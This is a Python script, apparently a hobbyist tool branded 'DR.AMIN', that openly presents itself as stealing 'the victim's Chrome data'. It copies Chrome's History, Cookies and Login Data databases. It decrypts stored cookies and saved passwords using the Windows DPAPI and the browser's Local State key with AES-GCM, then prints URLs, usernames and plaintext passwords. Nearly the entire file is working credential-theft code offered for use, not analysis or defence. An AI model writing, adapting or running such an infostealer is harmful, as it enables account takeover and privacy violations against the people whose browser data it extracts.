import os
import sqlite3
import json
import shutil
import shutil
import base64
from Crypto.Cipher import AES
import win32crypt

def dr():
    dr = '''

  DDDDDDDDDDDD    RRRRRRRRRRRR      .        AAAAA       M          M   IIIIIII    N     N
  D           D   R           R     .       A     A      MM        MM      I       NN    N
  D           D   RRRRRRRRRRRR      .      AAAAAAAAA     M M      M M      I       N N   N
  D           D   R           R     .      A       A     M  M    M  M      I       N  N  N
  DDDDDDDDDDDD    R            R    .      A       A     M   MMMM   M   IIIIIII    N   NNN 
 
           All of the victim's Chrome data will be at your disposal with this tool                  
 '''
    print(dr)

dr()


chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")

if not os.path.exists(chrome_path):
    print("Chrome data path not found.")
    exit()


history_db = os.path.join(chrome_path, "History")
if os.path.exists(history_db):
    backup_path = "./History_backup"
    shutil.copy2(history_db, backup_path)
    conn = sqlite3.connect(backup_path)
    cursor = conn.cursor()

    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 20")
    history_data = [
        {"url": row[0], "title": row[1], "visit_count": row[2], "last_visit_time": row[3]} 
        for row in cursor.fetchall()
    ]

    print("Extracted Chrome History:")
    print(json.dumps(history_data, indent=2))

    conn.close()
    os.remove(backup_path)
else:
    print("No history file found.")

cookies_db = os.path.join(chrome_path, "Cookies")
if os.path.exists(cookies_db):
    backup_path = "./Cookies_backup"
    shutil.copy2(cookies_db, backup_path)
    conn = sqlite3.connect(backup_path)
    cursor = conn.cursor()

    cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
    cookies_data = []

    for row in cursor.fetchall():
        host_key, name, path, encrypted_value = row
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        cookies_data.append({"host_key": host_key, "name": name, "path": path, "value": decrypted_value})

    print("\nExtracted Chrome Cookies:")
    print(json.dumps(cookies_data, indent=2))

    conn.close()
    os.remove(backup_path)
else:
    print("No cookies file found.")

def get_encryption_key():
   
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    encrypted_key = encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(encrypted_password, key):
    
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        
        key = key[:32]  

        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return f"Error: {str(e)}"

def extract_chrome_passwords():
    key = get_encryption_key()  
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default")
    login_db = os.path.join(chrome_path, "Login Data")

    if not os.path.exists(login_db):
        print("No login data file found.")
        return

    backup_path = "./LoginData_backup"
    shutil.copy2(login_db, backup_path)
    conn = sqlite3.connect(backup_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    passwords_data = []

    for row in cursor.fetchall():
        origin_url, username, encrypted_password = row
        if encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, key)
        else:
            decrypted_password = ""
        passwords_data.append({"url": origin_url, "username": username, "password": decrypted_password})

    print("\nExtracted Chrome Passwords:")
    print(json.dumps(passwords_data, indent=2))

    conn.close()
    os.remove(backup_path)

if __name__ == "__main__":
    extract_chrome_passwords()

input("Press any key to exit...")